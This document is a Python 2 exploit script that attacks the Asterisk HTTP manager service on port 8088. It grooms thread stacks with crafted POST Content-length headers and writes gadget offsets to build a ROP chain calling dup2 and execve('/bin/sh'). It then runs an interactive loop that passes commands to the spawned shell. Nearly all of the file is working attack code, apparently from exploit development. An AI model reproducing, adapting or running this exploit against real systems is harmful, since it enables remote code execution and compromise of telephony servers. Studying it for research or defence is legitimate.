#!/usr/bin/python
import socket
import time
import sys
from asterisk_class_mem_dumper import AsteriskMemDumper

amd = AsteriskMemDumper(116*8, 0x39580, 1)
SLEEP_TIME = 0.3

def new_conn():
  time.sleep(SLEEP_TIME)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect( ("localhost", 8088) )
  return s

def send_header(s,content_length):
  time.sleep(SLEEP_TIME)
  header = ("POST /asterisk/manager HTTP/1.0\r\n"+
            "Host: localhost\r\n"+
            "Content-length: "+str(content_length)+"\r\n"+
            "\r\n")
  s.send(header)

def send_data(s, data):
  time.sleep(SLEEP_TIME)
  s.send(data)

def close_conn(s):
  time.sleep(SLEEP_TIME)
  s.close()

def spray_retaddr(offset, data=None):
  s = new_conn()
  send_header(s,offset)
  if data: send_data(s, data)
  close_conn(s)

def send_cmd(s, cmd, printMessage=True):
  s.send(cmd+'\n')
  #time.sleep(1)
  try:
    msg = s.recv(4096)
    if printMessage: print msg
  except socket.timeout, e:
    err = e.args[0]
    # this next if/else is a bit redundant, but illustrates how the
    # timeout exception is setup
    if err == 'timed out':
      print 'recv timed out, retry later'
    else:
      print 'e:', e
  except socket.error, e:
    print 'socket.error:', e

def spawn_writers(writers, offsets_to_write):
  num_wr = len(offsets_to_write)
  for i in range(len(offsets_to_write)):
    print "spawning writer (%d/%d)" % (i+1,num_wr)
    writers.append(new_conn())

def position_writers(writers, offsets_to_write, rop_offset, stacksize, frame_size):
  gap = 0x100
  num_wr = len(writers)
  for i in range(len(offsets_to_write)):
    #print "preparing writer [%X] (%d/%d)" % (i%6+10 + (i%6+10)*16,i+1,num_wr)
    print "preparing writer [%X] (%d/%d)" % (i%15+1 + (i%15+1)*16,i+1,num_wr)
    w = writers[i]
    o = offsets_to_write[num_wr-i-1] # will display the offsets nice in memory
    cnt = num_wr - i # multiply sizes with cnt to set them in right position
    send_header(w, stacksize * (cnt+1) + rop_offset + frame_size * cnt + gap)
                                # 1 extra thread that massages the ret addresses on the stack
    #send_data(w, ('%c' % (i%6+10 + (i%6+10)*16)) * (frame_size * (cnt-1) + gap + o[0] + 0x10)) 
    send_data(w, ('%c' % (i%15+1 + (i%15+1)*16)) * (frame_size * (cnt-1) + gap + o[0] + 0x10)) 
         # +0x10, fix offset, rop thread's RSP was 0x10 lower, so send 0x10 more bytes to fix offset 
    amd.dumpRopData()
  
  #raw_input("check stack of rop thread")
   
def do_offset_writes(writers, offsets_to_write):
  num_wr = len(writers)
  for i in range(len(offsets_to_write)):
    print "writing at offset (%d/%d)" % (i+1,num_wr)
    w = writers[i]
    o = offsets_to_write[num_wr-i-1]
    #w.send(o[1])
    send_data(w,o[1])
    i += 1
    amd.dumpRopData()

def do_attack():
  stacksize = 0x7c000
  rop_offset = 0x3e000 # ~offset(actually buffer size) in stack that will contain the rop chain
  frame_size = 208 # bytes
  writers = []
  offsets_to_write = [
    (0x000, '\x00' * 0x8),
    (0x018, '\x21' + '\x00'*0x2F + '\xE2'), # \x21 = 33 = syscall nr of dup2
                                           # \xE2 = gadget offset
    (0x098, '\x4D'), # = gadget offset
    (0x0A0, '\x00'*0x18 + '\x4D'), # rsi = 0x0, \x4D = gadget offset
    (0x0C8, '\xB0'), # = gadget offset
    (0x0E8, '\x6B'), # = gadget offset
    (0x0F8, '\x55'), # = gadget offset
    #(0x100, '\x1B' + '\x00'*0x7 + '\x4B'), # rdi = \x1B = 27 TODO = sock fd, \x4B = gadget offset
    (0x100, '\x4D' + '\x00'*0x7 + '\x4B'), # rdi = \x4d = 77 TODO = sock fd, \x4B = gadget offset
    (0x118, '\xB0'), # = gadget offset
    (0x138, '\x6B'), # = gadget offset
    (0x148, '\x95'), # = gadget offset
    (0x188, '\x00'*0x20 + '\xB0'), # r12 = 0x0, \xB0 = gadget offset
    (0x1C8, '\x6B'), # = gadget offset
    (0x1D8, '\x55'), # = gadget offset
    (0x1E8, '\x5C'), # = gadget offset
    (0x1F8, '\xB0'), # = gadget offset
    (0x210, '\x00'*0x8 + '\x6B'), # rbp = 0x0, \x6B = gadget offset
    (0x228, '\x95'), # = gadget offset
    (0x230, '/bin/sh\x00' + '\x00'*0x48 + '\x3B' + '\x00'*0x7 + '\x5C'),
                                          #= 59 = execve syscall, \x5C = gadget offset
    (0x298, '\xB0'), # = gadget offset
    (0x2B8, '\x07'), # = gadget offset
    (0x2E8, '\xB0'), # = gadget offset
    (0x308, '\x6B'), # = gadget offset
    (0x318, '\x40'), # = gadget offset
    (0x328, '\x00'*0x50 + '\x2E') # [rsp+8] = 0x0, \x2E = gadget offset
  ]

  # TODO create 25 threads phase_1
  spawn_writers(writers, offsets_to_write)

  s2 = new_conn() # this gap/stack will be used in repeated connection creation and termination to spray ret addr
  s1 = new_conn() # used to exec ROP chain
  print "spawning thread that will contain ROP chain"
  time.sleep(0.5)
  amd.getRopAddr()
  time.sleep(0.25)
  amd.dumpRopData()
  time.sleep(0.5)
  close_conn(s2) 

  # TODO get 25 threads into position phase_2
  position_writers(writers, offsets_to_write, rop_offset, stacksize, frame_size)

  send_header(s1, rop_offset)
  amd.dumpRopData()

  i = 1
  num_massages = 9
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize + 0x020, '\0') # must send data to get diff. ret addr on stack
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize - 0x0C0)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize - 0x110)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize - 0x170)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  #raw_input("check stack for buffer pointers..")
  spray_retaddr(rop_offset + stacksize - 0x1A0)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  #raw_input("check if rdi would get buf pointer")
  spray_retaddr(rop_offset + stacksize - 0x1F0)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize - 0x290)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize - 0x2E0)
  amd.dumpRopData()
  i+=1
  print "massaging return addresses (%d/%d)" % (i,num_massages)
  spray_retaddr(rop_offset + stacksize - 0x380)
  amd.dumpRopData()

  # TODO write data at the offsets phase_3
  do_offset_writes(writers, offsets_to_write)

  #raw_input("Check FD of next conn! Press Enter to create conn")
  s2 = new_conn() # will be used for interacting with the shell
  s2.settimeout(5)
  #raw_input("Check FD of next conn! Check new FD!")

  #raw_input("Press Enter to close connection s1 and start executing the rop chain")
  print "starting execution of rop chain"
  time.sleep(1)
  close_conn(s1)
  #s1.send('A'*7)
  #raw_input("check if sh has started")

  print "waiting to get shell"
  time.sleep(2)
  print "setting I/O of sh"
  send_cmd(s2,"exec 1<&0; exec 2<&1; echo ", False)

  cmd = None
  while True:
    cmd = raw_input("$ ")
    if cmd.strip() == "": 
      continue
    send_cmd(s2, cmd)
    if cmd == "quit":
      break

do_attack()
